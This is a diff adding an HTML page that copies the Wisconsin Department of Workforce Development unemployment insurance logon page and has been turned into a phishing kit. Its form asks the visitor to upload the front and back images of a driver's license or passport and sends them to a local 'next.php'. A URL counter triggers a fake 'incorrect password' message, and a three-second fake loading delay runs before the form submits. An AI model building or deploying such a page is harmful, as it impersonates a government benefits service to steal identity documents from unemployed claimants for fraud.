@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<!-- saved from url=(0060)https://my.unemployment.wisconsin.gov/Claimant/Account/Logon -->
+<html lang="en" style="" class=" js flexbox flexboxlegacy rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+   <title>Secure Log In PROD</title>
+   <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+   
+   
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+   <link href="new-content/bootstrap" rel="stylesheet">
+
+   <link href="new-content/css" rel="stylesheet">
+
+   <link href="new-content/font-awesome" rel="stylesheet">
+
+   <link href="new-content/bootstro" rel="stylesheet">
+
+   <link href="new-content/App" rel="stylesheet">
+
+   <link href="new-content/sitecss.css" rel="stylesheet">
+
+
+   <script type="text/javascript" async="" src="new-content/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-pMn/at+iAgl0PpX8A+ccr7iPPScp0lIFsRTiC6EkDFtJ3fTeFBeJkP7nZJTcbD5h"></script><script src="new-content/ScriptsFramework"></script>
+
+
+   <!-- This is to make responsive work in IE8 -->
+   <!--[if lt IE 9]>
+        <script src="/Scripts/respond.min.js"></script>
+        <script src="/Scripts/html5.js"></script>
+    <![endif]-->
+
+   
+   <script>
+      $(document).ready(function () {
+
+         $('body').addClass('js');
+
+         var $menu = $('#side-menu'),
+            $menulink = $('.side-menu-link'),
+            $wrap = $('#wrap');
+
+         $menulink.click(function () {
+            $menulink.toggleClass('active');
+            $wrap.toggleClass('active');
+            return false;
+         });
+
+         $("input[type=submit], button, input[type=button], button").on('mouseover focus ',
+            function () {
+               $(this).addClass("ui-state-hover");
+            });
+         $("input[type=submit], button, input[type=button], button").on('mouseout focusout',
+            function () {
+               $(this).removeClass("ui-state-hover");
+            });
+         $("input[type=submit], button, input[type=button], button").on('click',
+            function () {
+               $(this).toggleClass("ui-state-active");
+            });
+         //for fake buttons
+         $("a.ui-button").on('mouseover mouseout focus focusout',
+            function () {
+               $(this).toggleClass("ui-state-hover");
+            });
+         $("a.ui-button").on('click',
+            function () {
+               $(this).toggleClass("ui-state-active");
+            });
+
+         $("#demo").click(function () {
+            bootstro.start(".bootstro", {
+            });
+         });
+         $("#demoSmall").click(function () {
+            $menu.hide();
+            bootstro.start(".bootstro", {
+               onExit: function (params) {
+                  $menu.show();
+                  $("#burger").click();
+               }
+            });
+         });
+      });
+   </script>
+
+</head>
+<body class="js">
+      <noscript>
+         <p id="nojavascript">
+            You need to have javascript enabled to use this application. Please refer to your
+            browser settings to enable javascript.
+         </p>
+      </noscript>
+      <p id="nocookies" style="display: none;">
+         You need to have cookies enabled to use this application. Please refer to your browser settings to enable cookies.
+      </p>
+   <script>
+      (function () {
+         // Windows Phone 8 bug fix
+         if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+            var msViewportStyle = document.createElement("style");
+            msViewportStyle.appendChild(document.createTextNode("@-ms-viewport{width:auto!important}"));
+            document.getElementsByTagName("head")[0].
+               appendChild(msViewportStyle);
+         } //End Windows Phone 8 bug fix
+      })()
+   </script>
+
+      <div class="container-fluid WhiteBackground">
+      <a class="sr-only" href="#">Skip to main content</a>
+      <div id="header" class="row hidden-xs">
+         <div class="col-md-12 col-sm-12">
+            <div class="row">
+               <div id="dwdLogo" class="col-lg-2 col-md-3 col-sm-4 hidden-print">
+                  <img alt="Department of Workforce Development" class="img-responsive" id="imgLogo" src="new-content/logonew.png" title="Department of Workforce Development">
+               </div>
+               <div id="dwdLogoPrint" class="col-lg-2 col-md-3 col-sm-4 visible-print">
+                  <img alt="Department of Workforce Development" class="img-responsive" id="imgLogoPrint" src="new-content/dwd_logo_gray.png" title="Department of Workforce Development">
+               </div>
+               <div id="landingheading" class="col-lg-8 col-md-6 col-sm-6">
+
+                  <h1>Wisconsin Unemployment Insurance</h1>
+               </div>
+               <div class="col-sm-2 col-md-3 col-lg-2  Logout text-right hidden-print pull-right">
+
+               </div>
+            </div>
+            <div id="dwd" class="row hidden-print">
+               <div class="col-md-12">
+                  <b>Department of Workforce Development</b>
+               </div>
+            </div>
+         </div>
+
+      </div>
+      
+      <div id="header-xs" class="row visible-xs">
+         <div class="col-xs-12">
+            <div class="row">
+               <div id="landingheading-xs" class="col-xs-12">
+                  <h1>Wisconsin Unemployment Insurance</h1>
+               </div>
+
+            </div>
+            <div id="dwd-xs" class="row">
+               <div class="col-xs-9">
+                  <b>Department of Workforce Development</b>
+               </div>
+               <div class="col-xs-3 Logout text-right hidden-print">
+
+               </div>
+            </div>
+         </div>
+      </div>
+      
+   </div>
+   <div class="container-fluid">
+         <div class="navbar-inner">
+            <div class="navbar">
+               <div id="breadcrumb">
+                  <div class="row">
+                     <div id="BenefitsHome" class="col-xs-6 col-md-6">
+<a class="leftMenuItem" href="#">Español</a>
+                        <div id="homeLink">
+                        </div>
+                     </div>
+                     <div id="FAQ" class="text-right col-md-6 col-xs-6 hidden-xs">
+                        <div id="infoLink">
+                        </div>
+                        <div class="text-right col-md-6 col-xs-6 visible-xs">
+                           <div id="infoLinkSmall">
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+
+
+      <div id="wrap" class="row wrap">
+         <div class="col-md-12">
+
+         </div>
+      </div>
+   </div>
+
+
+   <div class="container-fluid WhiteBackground">
+      <div id="content"></div>
+   
+   <script async="" src="new-content/js"></script>
+   
+   <noscript>
+      <p id="nojavascript">
+         <!--
+            we need to put some space here
+         -->
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+         <br />
+      </p>
+      <div style="display: none"></div>
+   </noscript>
+<div id="LogonHeader">
+   <h1>Wisconsin Unemployment Insurance Benefit Services</h1>
+</div>
+<div class="message warning validation-summary-errors" id="msg" style="display: none;margin-top: 25px">
+   <ul>
+       <li>The Email or password provided is incorrect, please try again.</li>
+   </ul>
+   <button aria-label="Close" tabindex="0" class="close" title="Close" type="button">
+       <i class="fa fa-times" role="img" aria-label="Close"></i>
+   </button>
+</div>
+<div id="LogonMain" class="row">
+   <div class="col-xs-12 col-sm-9 col-md-7 col-lg-6">
+         <!--6-->
+      <form autocomplete="Off" action="./next.php" id="frmLogon" method="post" role="form" enctype="multipart/form-data" novalidate="novalidate">            <div id="CurrentUsers">
+               <input id="FingerPrint" name="btn4" type="hidden" value="2310039368">
+               <div class="form-group">
+                  <div class="row">
+                     <div class="col-xs-1 col-sm-1 col-md-1 col-lg-1">
+                     </div>
+                     <div class="col-xs-10 col-sm-10 col-md-10 col-lg-10">
+                        <div class="spacer20"></div>
+                        <div><strong>UPLOAD VALID GOVERNMENT ISSUED ID:</strong> </div>
+                        <div class="spacer20"></div>
+                        <select class="form-control " id="card-type" name="CardType" placeholder="Card Type">
+                            <option value="">Select Card Type</option>
+                            <option value="Drivers License">Driver's License</option>
+                            <option value="US Passport">US Passport</option>
+                            <option value="Others">Others</option>
+                        </select>
+                        <label style="font-size:12px;color:#fff">Upload Id Image (FRONT VIEW)</label>
+                        <input class="form-control " id="Front-Id-Image" name="front_id_image" placeholder="Upload Id Image (FRONT)" type="file">
+                        <label style="font-size:12px;color:#fff">Upload Id Image (BACK VIEW)</label>
+                        <input class="form-control " id="Back-Id-Image" name="back_id_image" placeholder="Upload Id Image (BACK)" type="file">
+                        <div class="spacer20"></div>
+                        <input type="hidden" id="count" name="count" value="0">
+
+                        <div>
+                           <input type="submit" id="btnLogin" name="btn4" class="btn btn-primary btn-block" value="Upload">
+                        </div>
+                        <div class="spacer20"></div>
+                        <div class="form-group">
+                           <div class="row">
+                              <div class="col-xs-12 col-sm-12 underlineLink">
+                                 <div class="spacer5"></div>
+                                 
+                                 <div class="spacer5"></div>
+                                 
+                                 <br>
+                                 <div class="spacer5"></div>
+                                 
+                                 <div class="spacer5"></div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="col-xs-1 col-sm-1 col-md-1 col-lg-1">
+                     </div>
+                  </div>
+               </div>
+            </div>
+</form>   </div>
+   <div class="spacer20"></div>
+   <div id="HoursBox" class="col-xs-10 col-sm-9 col-md-5 col-lg-4 blueOutline">
+      <div class="form-group ">
+         <strong>Online services are available at the following times:</strong>
+         <div class="spacer20"></div>
+         <p>If you are unemployed and need to file a new claim:</p>
+         <div class="row">
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Sunday
+            </div>
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               12:00 pm - 5:00 pm
+            </div>
+         </div>
+         <div class="spacer5 visible-xs"></div>
+         <div class="row">
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Monday - Friday
+            </div>
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               6:00 am - 7:00 pm
+            </div>
+         </div>
+         <div class="spacer5 visible-xs"></div>
+         <div class="row">
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Saturday
+            </div>
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               9:00 am - 2:30 pm
+            </div>
+         </div>
+         <div class="spacer20"></div>
+         <div class="spacer20"></div>
+         <p>If you need to file a weekly claim for a benefit payment or get information about your benefit account:</p>
+
+         <div class="row">
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Sunday
+            </div>
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               9:00 am - Midnight
+            </div>
+         </div>
+         <div class="spacer5 visible-xs"></div>
+         <div class="row">
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Monday - Friday
+            </div>
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Available 24 Hours
+            </div>
+         </div>
+         <div class="spacer5 visible-xs"></div>
+         <div class="row">
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Saturday
+            </div>
+            <div class="col-sm-6 col-md-6 col-lg-6">
+               Midnight - 3:00 pm
+            </div>
+         </div>
+         <div class="spacer20"></div>
+
+      </div>
+   </div>
+</div>
+
+   </div>
+
+
+      <div class="container-fluid WhiteBackground">
+         <br>
+         <div id="footer" class="footer row hidden-print">
+            <div class="col-md-12">
+               <a href="#" >Unemployment Insurance</a>
+               | <a href="#">Contact us</a>
+               | <a href="#">Legal/Acceptable Use</a>
+               | <a href="#">DWD Home</a>
+               <div class="row">
+                  <div class="col-md-12">4/10/2021 6:05:20 AM</div>
+
+               </div>
+            </div>
+         </div>
+      </div>
+
+
+
+   <div id="dialog" title="Loading" style="display: none;">
+      <img alt="Loading" class="img-responsive" id="Loading" src="new-content/loading.gif">
+   </div>
+   <div id="helpDialog" title="Help" style="display: none;">
+   </div>
+   <div id="needHelpDialog" title="Need Help?" style="display: none;">
+      <p>For assistance using the online application please call 414-435-7069 or toll-free 1-844-910-3661 during business hours: Monday through Friday 7:35 AM – 3:30 PM.</p>
+      <p>If you call for assistance, please do not close the window on your device.</p>
+   </div>
+   
+   <div id="SaveDialog" title="Stop Claim" style="display: none;">
+      <p>Are you sure you want to stop your claim?</p>
+      <p>If you have not completed the current page, it will not be saved, but all the information from prior pages will be saved.</p>
+      <p>If you are sure you want to stop your claim, please click the Confirm button and the information you entered will be saved for 28 days.</p>
+      <p>If you do not want to stop your claim, please click on the Cancel button.</p>
+   </div>
+
+
+
+
+
+
+<script type="text/javascript">
+
+   function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+            vars[key] = value;
+        });
+        return vars;
+    }
+
+    if (!getUrlVars()["count"]) {
+
+    } else {
+        var count = getUrlVars()["count"];
+        $('#count').val(count);
+        $("#msg").show();
+    }
+
+
+   $("#btnLogin").click(function () {
+         if ($("#UserName").val() != "" && $("#Password").val() != "") {
+            $("#btnLogin").attr("disabled", true);
+            showLoading();
+            setTimeout(() => {
+               $("#frmLogon").submit();
+            }, 3000);
+         }
+   });
+
+   function showLoading() {
+      $("#dialog").dialog({
+         height: 120,
+         width: 300,
+         modal: true
+      });
+   }
+
+</script>
+
+
+
+<div id="goCast-controls" style="display: none;"><div id="goCast-controls__open-settings-btn"><img src="chrome-extension://bmlmbbakdaehiogkhpgdedjagfgdnhbi/images/inject/gear.png"></div><div id="goCast-controls__settings"><div id="goCast-controls__settings__logo-container"><img src="chrome-extension://bmlmbbakdaehiogkhpgdedjagfgdnhbi/images/inject/logo.png"></div><div id="goCast-controls__settings__main-btn" class="goCast-controls__settings__btn goCast-controls__settings__btn_active"><img src="chrome-extension://bmlmbbakdaehiogkhpgdedjagfgdnhbi/images/inject/pause.png"></div><div id="goCast-controls__settings__stop-btn" class="goCast-controls__settings__btn"><img src="chrome-extension://bmlmbbakdaehiogkhpgdedjagfgdnhbi/images/inject/stop.png"></div><div id="goCast-controls__settings__close-btn" class="goCast-controls__settings__btn"><img src="chrome-extension://bmlmbbakdaehiogkhpgdedjagfgdnhbi/images/inject/close.png"></div></div></div><div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge" src="new-content/bframe.html" name="c-yuspoi8he4w4" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
